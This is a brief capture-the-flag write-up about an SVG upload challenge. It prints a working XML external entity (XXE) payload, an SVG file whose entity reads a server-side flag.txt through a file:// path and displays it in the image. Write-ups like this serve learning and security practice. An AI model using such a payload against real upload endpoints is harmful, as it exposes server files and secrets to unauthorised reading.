CTFd —  SVG file upload

This CTF required an SVG file to be uploaded which would do some kind of command execution upon being uploaded.

I searched for SVG and  XML external entity vulnerability and found some svg file formats. This one worked :

<?xml version="1.0" standalone="yes"?>

<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///../../../flag.txt" > ]>

<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">

   <text font-size="16" x="0" y="16">&xxe;</text>

</svg>
